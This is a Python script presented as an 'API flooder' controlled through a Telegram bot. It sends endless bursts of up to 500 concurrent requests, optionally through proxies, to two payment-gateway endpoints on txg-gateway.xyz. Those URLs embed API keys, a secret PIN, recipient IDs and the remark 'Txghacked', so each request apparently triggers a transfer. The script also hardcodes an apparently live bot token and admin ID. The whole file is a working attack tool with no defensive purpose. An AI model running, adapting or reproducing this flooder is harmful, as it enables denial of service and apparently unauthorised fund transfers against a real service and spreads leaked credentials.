#!/usr/bin/env python3
"""
Stable API flooder with Telegram bot control – runs on Railway without crashing.
"""
import asyncio
import aiohttp
import random
import time
import signal
import sys
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8"
ADMIN_ID = 8401097557

# ─── ATTACK CONFIG ────────────────────────────────────────
# No {comment} placeholder – use static URLs
TARGET_APIS = [
    "https://txg-gateway.xyz/client/api/send.php?api_key=86864a72c5e2f3ad32c1c8f52710959f&secret_pin=123456&toUser=6283146815&amount=1&remark=Txghacked",
    "https://txg-gateway.xyz/client/api/send.php?api_key=f692ed462bc0976b5332a11944103df7&secret_pin=123456&toUser=9359202967&amount=1&remark=Txghacked"
]

CONCURRENT = 500                # Safe for Railway – ~500 concurrent connections
TOTAL_REQUESTS = 0              # 0 = infinite
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ─── STATS ──────────────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0}
lock = asyncio.Lock()
start_time = time.time()
flooder_running = True
flooder_task_obj = None

def load_proxies():
    try:
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return []

# ─── ASYNC FLOODER ────────────────────────────────────────
async def fire(session, sem, url, proxy=None):
    async with sem:
        try:
            async with session.get(url, proxy=proxy, ssl=False, timeout=5) as resp:
                status = resp.status
            async with lock:
                stats['sent'] += 1
                if 200 <= status < 400:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1

async def flooder_loop():
    global flooder_running
    proxies = load_proxies() if USE_PROXIES else []
    sem = asyncio.Semaphore(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        logger.info("Flooder started, sending requests...")
        while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
            # Pick a random API
            url = random.choice(TARGET_APIS)
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(fire(session, sem, url, proxy))
            tasks.add(task)
            count += 1

            # Limit task accumulation to avoid memory leak
            if len(tasks) > CONCURRENT * 2:
                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                tasks = set(tasks)

            # Yield to event loop
            await asyncio.sleep(0)

        # Wait for remaining tasks
        if tasks:
            await asyncio.wait(tasks, timeout=10)
        logger.info("Flooder stopped.")

# ─── TELEGRAM BOT COMMANDS ────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(f"✅ Flooder is running.\nUse /status, /stop, /startflood")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⏱️ Uptime: {int(elapsed)}s\n"
           f"⚡ Avg Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'Yes' if flooder_running else 'No'}")
    await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running
    if update.effective_user.id != ADMIN_ID:
        return
    if not flooder_running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    flooder_running = False
    await update.message.reply_text("🛑 Stopping flooder gracefully...")

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, start_time, flooder_task_obj
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ Already running.")
        return
    flooder_running = True
    start_time = time.time()
    stats['sent'] = 0
    stats['ok'] = 0
    stats['fail'] = 0
    flooder_task_obj = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started.")

# ─── PERIODIC REPORT ──────────────────────────────────────
async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Auto Report**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    global flooder_task_obj
    # Start flooder in background
    flooder_task_obj = asyncio.create_task(flooder_loop())

    # Setup Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("startflood", start_flooder))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(send_periodic_report, interval=30, first=10)

    # Send startup notification
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – running stable.\n/status for stats, /stop to halt.")

    # Start polling (blocking)
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    try:
        # Keep the bot alive
        while True:
            await asyncio.sleep(60)
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        global flooder_running
        logger.info("Shutting down...")
        flooder_running = False
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
